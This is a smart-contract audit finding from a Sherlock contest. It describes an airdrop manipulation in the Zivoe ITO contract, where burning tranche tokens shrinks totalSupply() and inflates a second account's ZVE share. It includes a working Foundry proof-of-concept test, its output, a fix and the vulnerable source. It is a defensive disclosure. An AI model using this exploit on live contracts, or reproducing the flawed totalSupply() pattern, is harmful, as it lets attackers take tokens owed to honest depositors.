{
  "Title": "H-2: ITO can be manipulated",
  "Content": "# Issue H-2: ITO can be manipulated \n\nSource: https://github.com/sherlock-audit/2024-03-zivoe-judging/issues/12 \n\n## Found by \n0xShax2nk.in, 0xpiken, 0xvj, 14si2o\\_Flint, 9oelm, AMOW, Drynooo, Ironsidesec, JigglypuffAndPikachu, KupiaSec, Nihavent, SilverChariot, Tendency, blockchain555, coffiasd, dany.armstrong90, didi, ether\\_sky, hulkvision, joicygiore, lemonmon, mt030d, saidam017, sl1, zarkk01\n## Summary\nThe ITO allocates 3 pZVE tokens per senior token minted and 1 pZVE token per junior token minted. When the offering period ends, users can claim the protocol `ZVE token` depending on the share of all pZVE they hold. Only 5% of the total ZVE tokens will be distributed to users, which is equal to `1.25M` tokens.\n\nThe ITO can be manipulated because it  uses `totalSupply()` in its calculations.\n## Vulnerability Detail\n[`ZivoeITO.claimAirdrop()`](https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeITO.sol#L223-L228) calculates the amount of ZVE tokens that should be vested to a certain user. It then creates a vesting schedule and sends all junior and senior tokens to their recipient.\n\nThe formula is $pZVEOwned/pZVETotal * totalZVEAirdropped$ (in the code these are called `upper`, `middle` and `lower`).\n\n```solidity\n        uint256 upper = seniorCreditsOwned + juniorCreditsOwned;\n        uint256 middle = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply() / 20;\n        uint256 lower = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply() * 3 + (\n            IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply()\n        );\n```\n\nThese calculations can be manipulated because they use `totalSupply()`.  The tranche tokens have a public [`burn()`](https://github.com/sherlock-audit/2024-03-zivoe/blob/d4111645b19a1ad3ccc899bea073b6f19be04ccd/zivoe-core-foundry/src/ZivoeTrancheToken.sol#L72) function.\n\nAn attacker can use 2 accounts to enter the ITO. They will deposit large amounts of stablecoins towards the senior tranche. When the airdrop starts, they can claim their senior tokens and start vesting ZVE tokens. The senior tokens can then be burned. Now, when the attacker calls the `claimAirdrop` function with their second account, the denominator of the above equation will be much smaller, allowing them to claim much more ZVE tokens than they are entitled to.\n\n## Impact\nThere are 2 impacts from exploiting this vulnerability:\n - a malicious entity can claim excessively large part of the airdrop and gain governance power in the protocol\n - since the attacker would have gained unexpectedly large amount of ZVE tokens and the total ZVE to be distributed will be `1.25M`, the users that claim after the attacker may not be able to do so if the amount they are entitled to, added to the stolen ZVE, exceeds `1.25M`.\n\n## Code Snippet\nAdd this function to [`Test_ZivoeITO.sol`](https://github.com/sherlock-audit/2024-03-zivoe/blob/main/zivoe-core-testing/src/TESTS_Core/Test_ZivoeITO.sol) and import the `console`.\n\nYou can comment the line where Sue burns their tokens and see the differences in the logs.\n\n```solidity\n    function test_StealZVE() public {\n        // Sam is an honest actor, while Bob is a malicious one\n        mint(\"DAI\", address(sam), 3_000_000 ether);\n        mint(\"DAI\", address(bob), 2_000_000 ether);\n        zvl.try_commence(address(ITO));\n\n        // Bob has another Ethereum account, Sue\n        bob.try_transferToken(DAI, address(sue), 1_000_000 ether);\n        \n        // give approvals\n        assert(sam.try_approveToken(DAI, address(ITO), type(uint256).max));\n        assert(bob.try_approveToken(DAI, address(ITO), type(uint256).max));\n        assert(sue.try_approveToken(DAI, address(ITO), type(uint256).max));\n\n        // Sam deposits 2M DAI to senior tranche and 400k to the junior one\n        hevm.prank(address(sam));\n        ITO.depositBoth(2_000_000 ether, DAI, 400_000, DAI);\n       \n        // Bob deposits 2M DAI into the senior tranche using his both accounts\n        hevm.prank(address(bob));\n        ITO.depositSenior(1_000_000 ether, DAI);\n\n        hevm.prank(address(sue));\n        ITO.depositSenior(1_000_000 ether, DAI);\n\n        // Move the timestamp after the end of the ITO\n        hevm.warp(block.timestamp + 31 days);\n        \n        ITO.claimAirdrop(address(sue));\n        (, , , uint256 totalVesting, , , ) = vestZVE.viewSchedule(address(sue));\n\n        // Sue burn all senior tokens\n        vm.prank(address(sue));\n        zSTT.burn(1_000_000 ether);\n\n        console.log('Sue vesting: ', totalVesting / 1e18);\n\n        ITO.claimAirdrop(address(bob));\n        (, , , totalVesting, , , ) = vestZVE.viewSchedule(address(bob));\n\n        console.log('Bob vesting: ', totalVesting / 1e18);\n\n        ITO.claimAirdrop(address(sam));\n        (, , , totalVesting, , , ) = vestZVE.viewSchedule(address(sam));\n\n        console.log('Sam vesting: ', totalVesting / 1e18);\n    }\n```\n\n\nFair vesting without prior burning\n```solidity\n  Sue vesting:  312499\n  Bob vesting:  312499\n  Sam vesting:  625001\n```\n\nVesting after burning\n```solidity\n  Sue vesting:  312499\n  Bob vesting:  416666\n  Sam vesting:  833333\n```\n\nBob and Sue will be able to claim `~750 000` ZVE tokens and Sam will not be able to claim any, because the total exceeds `1.25M`.\n## Tool used\n\nManual Review\n\n## Recommendation\nIntroduce a few new variables in the ITO contract.\n```solidity\n   bool hasAirdropped;\n   uint256 totalZVE;\n   uint256 totalzSTT; \n   uint256 totalzJTT;\n```\n\nThen check if the call to `claimAidrop` is a first one and if it is, initialize the variables. Use these variables in the vesting calculations.\n\n```solidity\n    function claimAirdrop(address depositor) external returns (\n        uint256 zSTTClaimed, uint256 zJTTClaimed, uint256 ZVEVested\n    ) {\n            ...\n            if (!hasAirdropped) {\n                  totalZVE = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply();\n                  totalzSTT = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply();\n                  totalzJTT = IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply();\n                  hasAirdropped = true;\n            }\n            ...\n\n           uint256 upper = seniorCreditsOwned + juniorCreditsOwned;\n           uint256 middle = totalZVE / 20;\n           uint256 lower = totalzSTT * 3 + totalzJTT;\n      }\n```\n\n\n\n## Discussion\n\n**pseudonaut**\n\nThis is interesting - technically we can support overflow in these situations because there's more ZVE available in other contract. User's would need to burn important tokens, and lock-up capital for extended period of time (more than 1 block) and upside isn't present against what rewards are and capital-loss - net-positive for protocol\n\n**sherlock-admin2**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> high, allows to inflate ITO vesting amounts and cause loss of funds from ITO for the other users\n\n\n\n**panprog**\n\nMany dups of this issue talk about naturally increasing `totalSupply` due to new deposits, which decreases airdrop for users who start vesting later. The core reason is the same.\n\n**sherlock-admin2**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/Zivoe/zivoe-core-foundry/pull/266\n\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/280",
  "Code": [
    {
      "filename": "zivoe-core-foundry/src/ZivoeITO.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/token/ERC20/extensions/IERC20Metadata.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/utils/Context.sol\";\n\ninterface IERC20Mintable_ITO {\n    /// @notice Mints ERC20 token(s) for the provided account, increases totalSupply().\n    /// @param  account The address to mint tokens for.\n    /// @param  amount  The amount of tokens to mint.\n    function mint(address account, uint256 amount) external;\n}\n\ninterface IZivoeGlobals_ITO {\n    /// @notice Returns the address of the ZivoeDAO contract.\n    function DAO() external view returns (address);\n\n    /// @notice Returns the address of the ZivoeRewardsVesting ($ZVE) vesting contract.\n    function vestZVE() external view returns (address);\n\n    /// @notice Returns the address of the ZivoeYDL contract.\n    function YDL() external view returns (address);\n\n    /// @notice Returns the address of the ZivoeTrancheToken ($zJTT) contract.\n    function zJTT() external view returns (address);\n\n    /// @notice Returns the address of the ZivoeTrancheToken ($zSTT) contract.\n    function zSTT() external view returns (address);\n\n    /// @notice Returns the address of the ZivoeToken contract.\n    function ZVE() external view returns (address);\n\n    /// @notice Returns the Zivoe Laboratory address.\n    function ZVL() external view returns (address);\n\n    /// @notice Returns the address of the ZivoeTranches contract.\n    function ZVT() external view returns (address);\n\n    /// @notice Returns total circulating supply of zSTT and zJTT, accounting for defaults via markdowns.\n    /// @return zSTTSupply zSTT.totalSupply() adjusted for defaults.\n    /// @return zJTTSupply zJTT.totalSupply() adjusted for defaults.\n    function adjustedSupplies() external view returns (uint256 zSTTSupply, uint256 zJTTSupply);\n\n    /// @notice Handles WEI standardization of a given asset amount (i.e. 6 decimal precision => 18 decimal precision).\n    /// @param  amount              The amount of a given \"asset\" to be standardized.\n    /// @param  asset               The asset (ERC-20) from which to standardize the amount to WEI.\n    /// @return standardizedAmount  The input amount, standardized to 18 decimals.\n    function standardize(uint256 amount, address asset) external view returns (uint256 standardizedAmount);\n}\n\ninterface ITO_IZivoeRewardsVesting {\n    /// @notice Determines if account has vesting schedule set or not.\n    function vestingScheduleSet(address) external view returns(bool);\n\n    /// @notice Sets the vestingSchedule for an account.\n    /// @param  account         The account vesting $ZVE.\n    /// @param  daysToCliff     The number of days before vesting is claimable (a.k.a. cliff period).\n    /// @param  daysToVest      The number of days for the entire vesting period, from beginning to end.\n    /// @param  amountToVest    The amount of tokens being vested.\n    /// @param  revokable       If the vested amount can be revoked.\n    function createVestingSchedule(\n        address account, \n        uint256 daysToCliff, \n        uint256 daysToVest, \n        uint256 amountToVest, \n        bool revokable\n    ) external;\n}\n\ninterface ITO_IZivoeTranches {\n    /// @notice Unlocks the ZivoeTranches contract for distributions, sets initial variables.\n    function unlock() external;\n}\n\ninterface ITO_IZivoeYDL {\n    /// @notice Unlocks the ZivoeYDL contract for distributions, initializes values.\n    function unlock() external;\n}\n\n\n\n/// @notice This contract will facilitate the Zivoe ITO (\"Initial Tranche Offering\").\n///         This contract has the following responsibilities:\n///          - Permissioned by $zJTT and $zSTT to call mint() when an account deposits.\n///          - Escrow $zJTT and $zSTT until the ITO concludes.\n///          - Facilitate claiming of $zJTT and $zSTT when the ITO concludes.\n///          - Vest $ZVE simulatenously during claiming (based on $pZVE credits).\n///          - Migrate deposits to ZivoeDAO after the ITO concludes.\ncontract ZivoeITO is Context {\n\n    using SafeERC20 for IERC20;\n    \n    // ---------------------\n    //    State Variables\n    // ---------------------\n\n    address public immutable GBL;   /// @dev The ZivoeGlobals contract.\n    \n    address[] public stables;       /// @dev Stablecoin(s) allowed for juniorDeposit() or seniorDeposit().\n\n    uint256 public end;             /// @dev The unix when the ITO ends (airdrop is claimable).\n\n    bool public migrated;           /// @dev Triggers (true) when ITO concludes and assets migrate to ZivoeDAO.\n\n    mapping(address => bool) public airdropClaimed;         /// @dev Tracks if an account has claimed their airdrop.\n\n    mapping(address => uint256) public juniorCredits;       /// @dev Tracks $pZVE (credits) from juniorDeposit().\n    mapping(address => uint256) public seniorCredits;       /// @dev Tracks $pZVE (credits) from seniorDeposit().\n\n    uint256 private constant BIPS = 10000;\n\n\n\n    // -----------------\n    //    Constructor\n    // -----------------\n\n    /// @notice Initializes the ZivoeITO contract.\n    /// @param  _GBL     The ZivoeGlobals contract.\n    /// @param  _stables Array of stablecoins representing initial stablecoin inputs.\n    constructor (address _GBL, address[] memory _stables) {\n        GBL = _GBL;\n        stables = _stables;\n    }\n\n\n\n    // ------------\n    //    Events\n    // ------------\n\n    /// @notice Emitted during claimAirdrop().\n    /// @param  account     The account claiming their airdrop.\n    /// @param  zSTTClaimed The amount of Zivoe Senior Tranche ($zSTT) tokens received.\n    /// @param  zJTTClaimed The amount of Zivoe Junior Tranche ($zJTT) tokens received.\n    /// @param  ZVEVested  The amount of Zivoe ($ZVE) tokens received.\n    event AirdropClaimed(address indexed account, uint256 zSTTClaimed, uint256 zJTTClaimed, uint256 ZVEVested);\n\n    /// @notice Emitted during migrateDeposits().\n    /// @param  DAI     Total amount of DAI migrated from the ITO to ZivoeDAO and ZVL.\n    /// @param  FRAX    Total amount of FRAX migrated from the ITO to ZivoeDAO and ZVL.\n    /// @param  USDC    Total amount of USDC migrated from the ITO to ZivoeDAO and ZVL.\n    /// @param  USDT    Total amount of USDT migrated from the ITO to ZivoeDAO and ZVL.\n    event DepositsMigrated(uint256 DAI, uint256 FRAX, uint256 USDC, uint256 USDT);\n\n    /// @notice Emitted during commence().\n    /// @param  start   The unix when the ITO starts.\n    /// @param  end     The unix when the ITO ends (airdrop is claimable).\n    event ITOCommenced(uint256 start, uint256 end);\n\n    /// @notice Emitted during depositJunior().\n    /// @param  account         The account depositing stablecoins to junior tranche.\n    /// @param  asset           The stablecoin deposited.\n    /// @param  amount          The amount of stablecoins deposited.\n    /// @param  credits         The amount of credits earned.\n    /// @param  trancheTokens   The amount of Zivoe Junior Tranche ($zJTT) tokens minted.\n    event JuniorDeposit(\n        address indexed account, \n        address indexed asset, \n        uint256 amount, \n        uint256 credits, \n        uint256 trancheTokens\n    );\n\n    /// @notice Emitted during depositSenior().\n    /// @param  account         The account depositing stablecoins to senior tranche.\n    /// @param  asset           The stablecoin deposited.\n    /// @param  amount          The amount of stablecoins deposited.\n    /// @param  credits         The amount of credits earned.\n    /// @param  trancheTokens   The amount of Zivoe Senior Tranche ($zSTT) tokens minted.\n    event SeniorDeposit(\n        address indexed account, \n        address indexed asset, \n        uint256 amount, \n        uint256 credits, \n        uint256 trancheTokens\n    );\n    \n\n\n    // ---------------\n    //    Functions\n    // ---------------\n\n    /// @notice Checks if stablecoin deposits into the Junior Tranche are open.\n    /// @param  amount The amount to deposit.\n    /// @param  asset The asset (stablecoin) to deposit.\n    /// @return open Will return \"true\" if the deposits into the Junior Tranche are open.\n    function isJuniorOpen(uint256 amount, address asset) public view returns (bool open) {\n        uint256 convertedAmount = IZivoeGlobals_ITO(GBL).standardize(amount, asset);\n        (uint256 seniorSupp, uint256 juniorSupp) = IZivoeGlobals_ITO(GBL).adjustedSupplies();\n        return convertedAmount + juniorSupp <= seniorSupp * 2000 / BIPS;\n    }\n\n    /// @notice Claim $zSTT, $zJTT, and begin a vesting schedule for $ZVE.\n    /// @dev    This function MUST only be callable after the ITO concludes.\n    /// @param  depositor   The address to claim for, generally _msgSender().\n    /// @return zSTTClaimed Amount of $zSTT airdropped.\n    /// @return zJTTClaimed Amount of $zJTT airdropped.\n    /// @return ZVEVested   Amount of $ZVE vested.\n    function claimAirdrop(address depositor) external returns (\n        uint256 zSTTClaimed, uint256 zJTTClaimed, uint256 ZVEVested\n    ) {\n        require(end != 0, \"ZivoeITO::claimAirdrop() end == 0\");\n        require(block.timestamp > end || migrated, \"ZivoeITO::claimAirdrop() block.timestamp <= end && !migrated\");\n        require(!airdropClaimed[depositor], \"ZivoeITO::claimAirdrop() airdropClaimed[depositor]\");\n        require(\n            seniorCredits[depositor] > 0 || juniorCredits[depositor] > 0, \n            \"ZivoeITO::claimAirdrop() seniorCredits[depositor] == 0 && juniorCredits[depositor] == 0\"\n        );\n\n        airdropClaimed[depositor] = true;\n\n        // Temporarily store credit values, decrease them to 0 immediately after.\n        uint256 seniorCreditsOwned = seniorCredits[depositor];\n        uint256 juniorCreditsOwned = juniorCredits[depositor];\n\n        seniorCredits[depositor] = 0;\n        juniorCredits[depositor] = 0;\n\n        // Calculate proportion of $ZVE awarded based on $pZVE credits.\n        uint256 upper = seniorCreditsOwned + juniorCreditsOwned;\n        uint256 middle = IERC20(IZivoeGlobals_ITO(GBL).ZVE()).totalSupply() / 20;\n        uint256 lower = IERC20(IZivoeGlobals_ITO(GBL).zSTT()).totalSupply() * 3 + (\n            IERC20(IZivoeGlobals_ITO(GBL).zJTT()).totalSupply()\n        );\n\n        emit AirdropClaimed(depositor, seniorCreditsOwned / 3, juniorCreditsOwned, upper * middle / lower);\n\n        IERC20(IZivoeGlobals_ITO(GBL).zJTT()).safeTransfer(depositor, juniorCreditsOwned);\n        IERC20(IZivoeGlobals_ITO(GBL).zSTT()).safeTransfer(depositor, seniorCreditsOwned / 3);\n\n        if (upper * middle / lower > 0) {\n            ITO_IZivoeRewardsVesting(IZivoeGlobals_ITO(GBL).vestZVE()).createVestingSchedule(\n                depositor, 0, 360, upper * middle / lower, false\n            );\n        }\n        \n        return (seniorCreditsOwned / 3, juniorCreditsOwned, upper * middle / lower);\n    }\n\n    /// @notice Deposit stablecoins, mint Zivoe Junior Tranche ($zJTT) tokens and increase airdrop credits.\n    /// @dev    This function MUST only be callable during the ITO, and with accepted stablecoins.\n    /// @param  amount The amount to deposit.\n    /// @param  asset The asset to deposit.\n    function depositJunior(uint256 amount, address asset) public {\n        require(block.timestamp < end, \"ZivoeITO::depositJunior() block.timestamp >= end\");\n        require(!migrated, \"ZivoeITO::depositJunior() migrated\");\n        require(\n            asset == stables[0] || asset == stables[1] || asset == stables[2] || asset == stables[3],\n            \"ZivoeITO::depositJunior() asset != stables[0-3]\"\n        );\n        require(\n            !ITO_IZivoeRewardsVesting(IZivoeGlobals_ITO(GBL).vestZVE()).vestingScheduleSet(_msgSender()),\n            \"ZivoeITO::depositJunior() ITO_IZivoeRewardsVesting(vestZVE).vestingScheduleSet(_msgSender())\"\n        );\n\n        require(isJuniorOpen(amount, asset), \"ZivoeITO::depositJunior() !isJuniorOpen(amount, asset)\");\n\n        address caller = _msgSender();\n        uint256 standardizedAmount = IZivoeGlobals_ITO(GBL).standardize(amount, asset);\n\n        juniorCredits[caller] += standardizedAmount;\n\n        emit JuniorDeposit(caller, asset, amount, standardizedAmount, standardizedAmount);\n\n        IERC20(asset).safeTransferFrom(caller, address(this), amount);\n        IERC20Mintable_ITO(IZivoeGlobals_ITO(GBL).zJTT()).mint(address(this), standardizedAmount);\n    }\n\n    /// @notice Deposit stablecoins, mint Zivoe Senior Tranche ($zSTT) tokens and increase airdrop credits.\n    /// @dev    This function MUST only be callable during the ITO, and with accepted stablecoins.\n    /// @param  amount The amount to deposit.\n    /// @param  asset The asset to deposit.\n    function depositSenior(uint256 amount, address asset) public {\n        require(block.timestamp < end, \"ZivoeITO::depositSenior() block.timestamp >= end\");\n        require(!migrated, \"ZivoeITO::depositSenior() migrated\");\n        require(\n            asset == stables[0] || asset == stables[1] || asset == stables[2] || asset == stables[3],\n            \"ZivoeITO::depositSenior() asset != stables[0-3]\"\n        );\n        require(\n            !ITO_IZivoeRewardsVesting(IZivoeGlobals_ITO(GBL).vestZVE()).vestingScheduleSet(_msgSender()),\n            \"ZivoeITO::depositSenior() ITO_IZivoeRewardsVesting(vestZVE).vestingScheduleSet(_msgSender())\"\n        );\n\n        address caller = _msgSender();\n        uint256 standardizedAmount = IZivoeGlobals_ITO(GBL).standardize(amount, asset);\n\n        seniorCredits[caller] += standardizedAmount * 3;\n\n        emit SeniorDeposit(caller, asset, amount, standardizedAmount * 3, standardizedAmount);\n\n        IERC20(asset).safeTransferFrom(caller, address(this), amount);\n        IERC20Mintable_ITO(IZivoeGlobals_ITO(GBL).zSTT()).mint(address(this), standardizedAmount);\n    }\n\n    /// @notice Deposit stablecoins to both tranches simultaneously\n    /// @param amountSenior The amount to deposit to senior tranche\n    /// @param assetSenior The asset to deposit to senior tranche\n    /// @param amountJunior The amount to deposit to senior tranche\n    /// @param assetJunior The asset to deposit to senior tranche\n    function depositBoth(uint256 amountSenior, address assetSenior, uint256 amountJunior, address assetJunior) external {\n        // TODO: Validate _msgSender() downstream calls\n        depositSenior(amountSenior, assetSenior);\n        depositJunior(amountJunior, assetJunior);\n    }\n\n    /// @notice Migrate tokens to ZivoeDAO.\n    /// @dev    This function MUST only be callable after the ITO concludes (or earlier at ZVL discretion).\n    function migrateDeposits() external {\n        require(end != 0, \"ZivoeITO::migrateDeposits() end == 0\");\n        if (_msgSender() != IZivoeGlobals_ITO(GBL).ZVL()) {\n            require(block.timestamp > end, \"ZivoeITO::migrateDeposits() block.timestamp <= end\");\n        }\n        require(!migrated, \"ZivoeITO::migrateDeposits() migrated\");\n        \n        migrated = true;\n\n        emit DepositsMigrated(\n            IERC20(stables[0]).balanceOf(address(this)), \n            IERC20(stables[1]).balanceOf(address(this)), \n            IERC20(stables[2]).balanceOf(address(this)), \n            IERC20(stables[3]).balanceOf(address(this))\n        );\n\n        for (uint256 i = 0; i < stables.length; i++) {\n            IERC20(stables[i]).safeTransfer(IZivoeGlobals_ITO(GBL).DAO(), IERC20(stables[i]).balanceOf(address(this)));\n        }\n\n        ITO_IZivoeYDL(IZivoeGlobals_ITO(GBL).YDL()).unlock();\n        ITO_IZivoeTranches(IZivoeGlobals_ITO(GBL).ZVT()).unlock();\n    }\n\n    /// @notice Starts the ITO.\n    /// @dev    Only callable by ZVL.\n    function commence() external {\n        require(end == 0, \"ZivoeITO::commence() end !== 0\");\n        require(\n            _msgSender() == IZivoeGlobals_ITO(GBL).ZVL(), \n            \"ZivoeITO::commence() _msgSender() != IZivoeGlobals_ITO(GBL).ZVL()\"\n        );\n        emit ITOCommenced(block.timestamp, block.timestamp + 30 days);\n        end = block.timestamp + 30 days;\n    }\n\n}"
    },
    {
      "filename": "zivoe-core-foundry/src/ZivoeTrancheToken.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.17;\n\nimport \"../lib/openzeppelin-contracts/contracts/access/Ownable.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\";\nimport \"../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol\";\n\n\n\n/// @notice  This ERC20 contract outlines the tranche token functionality.\n///          This contract should support the following functionalities:\n///           - Mintable.\n///           - Burnable.\n///           - Inherit the ownable library to handle temporary minterRole management.\ncontract ZivoeTrancheToken is ERC20, Ownable {\n\n    // ---------------------\n    //    State Variables\n    // ---------------------\n\n    /// @dev Whitelist for accessibility to mint() function, exposed in isMinter() view function.\n    mapping(address => bool) private _isMinter;\n\n\n\n    // -----------------\n    //    Constructor\n    // -----------------\n\n    /// @notice Initializes the TrancheToken contract ($zTT).\n    /// @dev    _totalSupply for this contract initializes to 0.\n    /// @param  name_   The name (Zivoe Junior Tranche, Zivoe Senior Tranche).\n    /// @param  symbol_ The symbol ($zJTT, $zSTT).\n    constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) { }\n\n\n\n    // ------------\n    //    Events\n    // ------------\n\n    /// @notice This event is emitted when changeMinterRole() is called.\n    /// @param  account The account who is receiving or losing the minter role.\n    /// @param  allowed If true, account receives minter privlidges, if false the account loses minter privlidges.\n    event MinterUpdated(address indexed account, bool allowed);\n\n\n\n    // ---------------\n    //    Modifiers\n    // ---------------\n\n    /// @dev Enforces the caller has minter role privlidges.\n    modifier isMinterRole() {\n        require(_isMinter[_msgSender()], \"ZivoeTrancheToken::isMinterRole() !_isMinter[_msgSender()]\");\n        _;\n    }\n\n\n\n    // ---------------\n    //    Functions\n    // ---------------\n\n    /// @notice Returns the whitelist status of account for accessibility to mint() function.\n    /// @param  account The account to inspect whitelist status.\n    /// @return minter  Returns true if account is allowed to access the mint() function.\n    function isMinter(address account) external view returns (bool minter) { return _isMinter[account]; }\n\n    /// @notice Burns $zTT tokens.\n    /// @param  amount The number of $zTT tokens to burn.\n    function burn(uint256 amount) external { _burn(_msgSender(), amount); }\n\n    /// @notice Update an account's permission for access to mint() function.\n    /// @dev    Only callable by owner.\n    /// @param  account The account to change permissions for.\n    /// @param  allowed The permission to give account (true = permitted, false = prohibited).\n    function changeMinterRole(address account, bool allowed) external onlyOwner {\n        _isMinter[account] = allowed;\n        emit MinterUpdated(account, allowed);\n    }\n\n    /// @notice Mints $zTT tokens.\n    /// @dev    Only callable by accounts on the _isMinter whitelist.\n    /// @param  account The account to mint tokens for.\n    /// @param  amount  The amount of $zTT tokens to mint for account.\n    function mint(address account, uint256 amount) external isMinterRole { _mint(account, amount); }\n\n}"
    }
  ]
}